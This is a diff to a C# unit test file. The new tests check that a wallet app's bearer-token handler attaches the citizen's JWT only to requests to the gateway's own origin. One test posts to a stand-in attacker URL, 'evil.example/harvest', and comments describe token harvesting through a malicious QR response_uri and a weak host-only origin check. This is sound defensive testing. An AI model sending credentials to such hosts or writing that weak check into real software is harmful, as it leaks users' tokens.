@@ -185,7 +185,7 @@ public sealed class AuthAndBearerTests
         });
         var noRefreshHttp = new HttpClient(new StubHttpHandler((_, _) => new HttpResponseMessage()))
             { BaseAddress = new Uri("https://localhost/") };
-        var bearer = new BearerTokenHandler(store, noRefreshHttp, new SpySessionExpiryNotifier()) { InnerHandler = inner };
+        var bearer = new BearerTokenHandler(store, noRefreshHttp, new SpySessionExpiryNotifier(), new Uri("https://localhost/")) { InnerHandler = inner };
         var http = new HttpClient(bearer) { BaseAddress = new Uri("https://localhost/") };
 
         await http.GetAsync("api/v1/wallet/sync");
@@ -205,12 +205,155 @@ public sealed class AuthAndBearerTests
         });
         var noRefreshHttp = new HttpClient(new StubHttpHandler((_, _) => new HttpResponseMessage()))
             { BaseAddress = new Uri("https://localhost/") };
-        var bearer = new BearerTokenHandler(store, noRefreshHttp, new SpySessionExpiryNotifier()) { InnerHandler = inner };
+        var bearer = new BearerTokenHandler(store, noRefreshHttp, new SpySessionExpiryNotifier(), new Uri("https://localhost/")) { InnerHandler = inner };
         var http = new HttpClient(bearer) { BaseAddress = new Uri("https://localhost/") };
 
         await http.GetAsync("api/v1/wallet/sync");
 
         observedAuth.Should().BeNull("requests must go out unauthenticated when no token is stored");
+    }
+
+    // I1 (#1310/#1311 follow-up) — the citizen's JWT must never leave the gateway's own
+    // origin. Present.razor's direct_post client shares this exact handler and posts to an
+    // ABSOLUTE response_uri taken from an untrusted, citizen-scanned openid4vp:// request, so
+    // this is not a hypothetical: without the same-origin gate a malicious QR harvests the
+    // bearer token via a third-party response_uri.
+    [Fact]
+    public async Task BearerTokenHandler_SameOriginAbsoluteRequest_CarriesAuthorizationHeader()
+    {
+        var store = new InMemoryAccessTokenStore();
+        await store.SetAsync(new AccessTokenRecord("the-token", DateTimeOffset.UtcNow.AddHours(1), "x@example.com"));
+
+        string? observedAuth = null;
+        var inner = new StubHttpHandler((req, _) =>
+        {
+            observedAuth = req.Headers.Authorization?.ToString();
+            return new HttpResponseMessage(HttpStatusCode.OK);
+        });
+        var noRefreshHttp = new HttpClient(new StubHttpHandler((_, _) => new HttpResponseMessage()))
+            { BaseAddress = new Uri("https://gw.test/") };
+        var bearer = new BearerTokenHandler(store, noRefreshHttp, new SpySessionExpiryNotifier(), new Uri("https://gw.test/"))
+            { InnerHandler = inner };
+        // No BaseAddress on this client — mirrors PresentationDirectPostClient posting an
+        // absolute response_uri straight through HttpClient.PostAsync.
+        var http = new HttpClient(bearer);
+
+        await http.PostAsync("https://gw.test/api/presentations/callbacks/sorcha-wallet/00000000-0000-0000-0000-000000000000",
+            new StringContent("{}"));
+
+        observedAuth.Should().Be("Bearer the-token", "a same-origin response_uri is the legitimate sorcha-wallet callback");
+    }
+
+    [Fact]
+    public async Task BearerTokenHandler_CrossOriginAbsoluteRequest_OmitsAuthorizationHeader()
+    {
+        var store = new InMemoryAccessTokenStore();
+        await store.SetAsync(new AccessTokenRecord("the-token", DateTimeOffset.UtcNow.AddHours(1), "x@example.com"));
+
+        string? observedAuth = "sentinel";
+        var inner = new StubHttpHandler((req, _) =>
+        {
+            observedAuth = req.Headers.Authorization?.ToString();
+            return new HttpResponseMessage(HttpStatusCode.OK);
+        });
+        var noRefreshHttp = new HttpClient(new StubHttpHandler((_, _) => new HttpResponseMessage()))
+            { BaseAddress = new Uri("https://gw.test/") };
+        var bearer = new BearerTokenHandler(store, noRefreshHttp, new SpySessionExpiryNotifier(), new Uri("https://gw.test/"))
+            { InnerHandler = inner };
+        var http = new HttpClient(bearer);
+
+        // An attacker-controlled response_uri from a scanned/pasted openid4vp:// request.
+        await http.PostAsync("https://evil.example/harvest", new StringContent("{}"));
+
+        observedAuth.Should().BeNull(
+            "the citizen's bearer token must never be sent to a third-party response_uri");
+    }
+
+    // Review finding (Important 2): the four pre-existing origin tests differ from the
+    // gateway origin in HOST only. Rewriting IsSameOrigin as `requestUri.Host == origin.Host`
+    // — the single most plausible "simplification" — would leave all four passing while
+    // starting to leak the bearer to a different scheme or port on the same host. These two
+    // cases close that gap: scheme-only and port-only mismatches.
+    [Fact]
+    public async Task BearerTokenHandler_SchemeDiffersFromGatewayOrigin_OmitsAuthorizationHeader()
+    {
+        var store = new InMemoryAccessTokenStore();
+        await store.SetAsync(new AccessTokenRecord("the-token", DateTimeOffset.UtcNow.AddHours(1), "x@example.com"));
+
+        string? observedAuth = "sentinel";
+        var inner = new StubHttpHandler((req, _) =>
+        {
+            observedAuth = req.Headers.Authorization?.ToString();
+            return new HttpResponseMessage(HttpStatusCode.OK);
+        });
+        var noRefreshHttp = new HttpClient(new StubHttpHandler((_, _) => new HttpResponseMessage()))
+            { BaseAddress = new Uri("https://gw.test/") };
+        var bearer = new BearerTokenHandler(store, noRefreshHttp, new SpySessionExpiryNotifier(), new Uri("https://gw.test/"))
+            { InnerHandler = inner };
+        var http = new HttpClient(bearer);
+
+        // Same host as the gateway origin, but plain http:// instead of https://.
+        await http.GetAsync("http://gw.test/api/v1/wallet/sync");
+
+        observedAuth.Should().BeNull(
+            "a scheme mismatch against the gateway origin must withhold the bearer token even when the host matches");
+    }
+
+    [Fact]
+    public async Task BearerTokenHandler_PortDiffersFromGatewayOrigin_OmitsAuthorizationHeader()
+    {
+        var store = new InMemoryAccessTokenStore();
+        await store.SetAsync(new AccessTokenRecord("the-token", DateTimeOffset.UtcNow.AddHours(1), "x@example.com"));
+
+        string? observedAuth = "sentinel";
+        var inner = new StubHttpHandler((req, _) =>
+        {
+            observedAuth = req.Headers.Authorization?.ToString();
+            return new HttpResponseMessage(HttpStatusCode.OK);
+        });
+        var noRefreshHttp = new HttpClient(new StubHttpHandler((_, _) => new HttpResponseMessage()))
+            { BaseAddress = new Uri("https://gw.test/") };
+        var bearer = new BearerTokenHandler(store, noRefreshHttp, new SpySessionExpiryNotifier(), new Uri("https://gw.test/"))
+            { InnerHandler = inner };
+        var http = new HttpClient(bearer);
+
+        // Same host and scheme as the gateway origin, but a non-default port.
+        await http.GetAsync("https://gw.test:8443/api/v1/wallet/sync");
+
+        observedAuth.Should().BeNull(
+            "a port mismatch against the gateway origin must withhold the bearer token even when the host matches");
+    }
+
+    // Minor 4: production emits response_uri as a RELATIVE path when PublicBaseUrl is unset
+    // (the shipped configuration — see SorchaWalletPresentationConsumer), which HttpClient
+    // resolves against BaseAddress before the handler ever sees it. The positive same-origin
+    // test above uses an absolute URI; this covers the shape that actually ships.
+    [Fact]
+    public async Task BearerTokenHandler_SameOriginRelativeRequest_CarriesAuthorizationHeader()
+    {
+        var store = new InMemoryAccessTokenStore();
+        await store.SetAsync(new AccessTokenRecord("the-token", DateTimeOffset.UtcNow.AddHours(1), "x@example.com"));
+
+        string? observedAuth = null;
+        var inner = new StubHttpHandler((req, _) =>
+        {
+            observedAuth = req.Headers.Authorization?.ToString();
+            return new HttpResponseMessage(HttpStatusCode.OK);
+        });
+        var noRefreshHttp = new HttpClient(new StubHttpHandler((_, _) => new HttpResponseMessage()))
+            { BaseAddress = new Uri("https://gw.test/") };
+        var bearer = new BearerTokenHandler(store, noRefreshHttp, new SpySessionExpiryNotifier(), new Uri("https://gw.test/"))
+            { InnerHandler = inner };
+        // BaseAddress set, mirroring the shipped PresentationDirectPostClient wiring — a
+        // relative response_uri resolves same-origin against it before the handler runs.
+        var http = new HttpClient(bearer) { BaseAddress = new Uri("https://gw.test/") };
+
+        await http.PostAsync(
+            "api/presentations/callbacks/sorcha-wallet/00000000-0000-0000-0000-000000000000",
+            new StringContent("{}"));
+
+        observedAuth.Should().Be("Bearer the-token",
+            "a relative response_uri (PublicBaseUrl unset — the shipped configuration) resolves same-origin and must carry the bearer");
     }
 
     [Fact]
@@ -381,7 +524,7 @@ public sealed class AuthAndBearerTests
             Task.FromResult(JsonOk("{\"access_token\":\"new\",\"refresh_token\":\"rt2\",\"expires_in\":3600}"))))
             { BaseAddress = new Uri("https://gw.test/") };
 
-        var handler = new BearerTokenHandler(store, refreshHttp, new SpySessionExpiryNotifier()) { InnerHandler = inner };
+        var handler = new BearerTokenHandler(store, refreshHttp, new SpySessionExpiryNotifier(), new Uri("https://gw.test/")) { InnerHandler = inner };
         var client = new HttpClient(handler) { BaseAddress = new Uri("https://gw.test/") };
 
         var resp = await client.GetAsync("api/v1/wallet/credentials");
@@ -403,7 +546,7 @@ public sealed class AuthAndBearerTests
             { BaseAddress = new Uri("https://gw.test/") };
         var notifier = new SpySessionExpiryNotifier();
 
-        var handler = new BearerTokenHandler(store, refreshHttp, notifier) { InnerHandler = inner };
+        var handler = new BearerTokenHandler(store, refreshHttp, notifier, new Uri("https://gw.test/")) { InnerHandler = inner };
         var client = new HttpClient(handler) { BaseAddress = new Uri("https://gw.test/") };
 
         var resp = await client.GetAsync("api/v1/wallet/credentials");
@@ -444,7 +587,7 @@ public sealed class AuthAndBearerTests
             Task.FromResult(JsonOk("{\"access_token\":\"new\",\"refresh_token\":\"rt2\",\"expires_in\":3600}"))))
             { BaseAddress = new Uri("https://gw.test/") };
 
-        var handler = new BearerTokenHandler(store, refreshHttp, new SpySessionExpiryNotifier()) { InnerHandler = inner };
+        var handler = new BearerTokenHandler(store, refreshHttp, new SpySessionExpiryNotifier(), new Uri("https://gw.test/")) { InnerHandler = inner };
         var client = new HttpClient(handler) { BaseAddress = new Uri("https://gw.test/") };
 
         var resp = await client.PostAsync("api/v1/wallet/something",
@@ -467,7 +610,7 @@ public sealed class AuthAndBearerTests
             { BaseAddress = new Uri("https://gw.test/") };
         var notifier = new SpySessionExpiryNotifier();
 
-        var handler = new BearerTokenHandler(store, refreshHttp, notifier) { InnerHandler = inner };
+        var handler = new BearerTokenHandler(store, refreshHttp, notifier, new Uri("https://gw.test/")) { InnerHandler = inner };
         var client = new HttpClient(handler) { BaseAddress = new Uri("https://gw.test/") };
 
         var resp = await client.GetAsync("api/v1/wallet/credentials");
